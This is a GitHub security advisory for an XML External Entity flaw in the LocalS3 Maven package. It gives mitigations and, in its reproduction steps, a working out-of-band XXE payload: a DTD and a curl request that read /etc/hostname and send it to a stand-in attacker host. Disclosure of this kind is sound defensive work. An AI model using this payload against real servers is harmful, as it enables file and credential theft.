# [M] LocalS3 XML Parser Vulnerable to XML External Entity (XXE) Injection

## Summary
Severity: Medium
Advisory: GHSA-47qw-ccjm-9c2c
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-03-10
Source: https://github.com/advisories/GHSA-47qw-ccjm-9c2c
Type: github-advisory

## Affected
- Maven: `io.github.robothy:local-s3-rest` — affected >=0 <1.21

## Details
## Description

The LocalS3 project, which implements an S3-compatible storage interface, contains a critical XML External Entity (XXE) Injection vulnerability in its XML parsing functionality. When processing XML requests for multipart upload operations, the application accepts and processes XML external entities, allowing an attacker to read local system files and potentially make outbound network connections.

The vulnerability exists because the XML parser is configured to process external entities and DTD (Document Type Definition) declarations without proper restrictions. This allows an attacker to define external entities that can read local files and exfiltrate their contents through outbound HTTP requests.

The vulnerability is particularly severe as it allows direct access to sensitive files on the filesystem, bypassing any directory traversal protections that might be in place for normal S3 operations.

## Steps to Reproduce

1. Create a malicious DTD file containing the following content:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.domain/?flag=%file;'>">
%eval;
%exfil;
```

2. Host the malicious DTD file on an accessible web server

3. Initialize a multipart upload to the LocalS3 server:
```
curl -X PUT "http://app/test-bucket/test.txt?uploads"
```

4. Send a POST request to complete the multipart upload with the following XML payload:
    ```
   curl -X POST "http://app/test-bucket/test.txt?uploadId=[upload-id]" \
   -H "Content-Type: application/xml" \
   -d '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE data [
   <!ENTITY % dtd SYSTEM "http://attacker.domain/evil.dtd">
   %dtd;
   ]>
   <CompleteMultipartUpload>
       <Part>
           <PartNumber>1</PartNumber>
           <ETag>test</ETag>
       </Part>
   </CompleteMultipartUpload>'
    ```

The server will process the XML, load the external DTD, and when evaluating the entities, will read the contents of /etc/hostname and send them to the attacker's server via an HTTP request.

## Mitigations

- Disable DTD processing in the XML parser configuration
- If DTD processing is required, disable the ability to load external entities and external DTDs
- Implement XML parsing with secure defaults using JAXP's XMLConstants.FEATURE_SECURE_PROCESSING feature
- Set up proper input validation and sanitization for all XML processing operations

## Impact

An attacker can exploit this vulnerability to read arbitrary files from the server's filesystem and exfiltrate their contents through outbound HTTP requests. The vulnerability requires no authentication and can be exploited by anyone who can send requests to the LocalS3 server. This could lead to exposure of sensitive information including configuration files, credentials, and other confidential data stored on the server.

## References
- https://github.com/Robothy/local-s3/security/advisories/GHSA-47qw-ccjm-9c2c
- https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f
- https://github.com/Robothy/local-s3
